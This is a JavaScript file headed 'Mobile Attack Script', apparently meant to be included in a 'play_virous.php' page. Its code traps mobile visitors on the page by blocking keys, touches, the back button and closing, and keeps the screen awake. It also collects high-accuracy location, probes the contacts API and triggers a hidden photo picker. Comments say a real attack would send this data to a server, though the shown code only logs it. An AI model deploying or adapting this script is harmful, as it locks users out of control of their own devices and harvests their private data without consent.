/**
 * Mobile Attack Script
 * This script is designed to be included in the play_virous.php file
 * It contains additional functions specifically for mobile devices
 */

// Detect if the device is mobile
function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// Additional mobile-specific attack functions
const MobileAttack = {
    // Disable all hardware buttons (this is a simulation, as complete disabling is not possible with standard web APIs)
    disableHardwareButtons: function() {
        if (!isMobileDevice()) return false;
        
        // Attempt to capture all key events
        document.addEventListener('keydown', function(e) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, true);
        
        document.addEventListener('keyup', function(e) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, true);
        
        // Attempt to prevent volume button actions
        window.addEventListener('volumechange', function(e) {
            e.preventDefault();
            return false;
        }, true);
        
        return true;
    },
    
    // Prevent touch gestures
    disableTouchGestures: function() {
        if (!isMobileDevice()) return false;
        
        // Prevent touch events
        ['touchstart', 'touchmove', 'touchend', 'touchcancel'].forEach(function(eventType) {
            document.addEventListener(eventType, function(e) {
                // Allow only our specific UI elements to be touched
                if (!e.target.classList.contains('allowed-touch')) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, true);
        });
        
        return true;
    },
    
    // Attempt to access contacts (this is a simulation, as direct access is restricted)
    accessContacts: function() {
        if (!isMobileDevice()) return false;
        
        // This is just a placeholder - modern browsers restrict contact access
        // A real attack would use more sophisticated methods or exploits
        if (navigator.contacts && typeof navigator.contacts.find === 'function') {
            try {
                navigator.contacts.find(
                    ['displayName', 'name', 'phoneNumbers', 'emails'],
                    function(contacts) {
                        if (contacts && contacts.length > 0) {
                            // In a real attack, this data would be sent to the server
                            console.log('Contacts accessed:', contacts.length);
                        }
                    },
                    function(error) {
                        console.error('Error accessing contacts:', error);
                    }
                );
                return true;
            } catch (e) {
                console.error('Exception accessing contacts:', e);
                return false;
            }
        }
        return false;
    },
    
    // Attempt to access photos (this is a simulation, as direct access is restricted)
    accessPhotos: function() {
        if (!isMobileDevice()) return false;
        
        // Modern browsers require explicit file input
        // This creates a hidden file input and tries to programmatically trigger it
        // Note: Most browsers block this type of programmatic access
        try {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.multiple = true;
            input.style.position = 'absolute';
            input.style.top = '-1000px';
            input.style.opacity = '0';
            document.body.appendChild(input);
            
            input.addEventListener('change', function() {
                if (input.files && input.files.length > 0) {
                    // In a real attack, these files would be uploaded to the server
                    console.log('Photos accessed:', input.files.length);
                }
            });
            
            // Try to trigger the file dialog
            // Note: This will likely be blocked by the browser
            input.click();
            
            return true;
        } catch (e) {
            console.error('Exception accessing photos:', e);
            return false;
        }
    },
    
    // Prevent the user from leaving the page
    preventLeaving: function() {
        // Keep the device awake if possible
        if (navigator.wakeLock) {
            navigator.wakeLock.request('screen')
                .then(lock => {
                    console.log('Wake Lock activated');
                    // Store the wake lock for later release if needed
                    window.wakeLock = lock;
                })
                .catch(err => {
                    console.error('Wake Lock error:', err);
                });
        }
        
        // Attempt to capture the back button
        window.addEventListener('popstate', function(e) {
            history.pushState(null, null, document.URL);
            e.preventDefault();
            return false;
        }, true);
        
        // Attempt to prevent the page from being closed
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
        
        return true;
    },
    
    // Attempt to get device location with high accuracy
    getDetailedLocation: function() {
        if (!navigator.geolocation) return false;
        
        try {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    };
                    
                    // In a real attack, this data would be sent to the server
                    console.log('Detailed location:', locationData);
                    return locationData;
                },
                function(error) {
                    console.error('Error getting location:', error);
                    return false;
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
            return true;
        } catch (e) {
            console.error('Exception getting location:', e);
            return false;
        }
    },
    
    // Initialize all attack vectors
    initAll: function() {
        if (!isMobileDevice()) {
            console.log('Not a mobile device, some features will be limited');
        }
        
        this.disableHardwareButtons();
        this.disableTouchGestures();
        this.preventLeaving();
        this.getDetailedLocation();
        
        // These are more invasive and likely to be blocked or require permissions
        setTimeout(() => {
            this.accessContacts();
            this.accessPhotos();
        }, 5000);
        
        return true;
    }
};

// Export the module if in a CommonJS environment
if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
    module.exports = MobileAttack;
}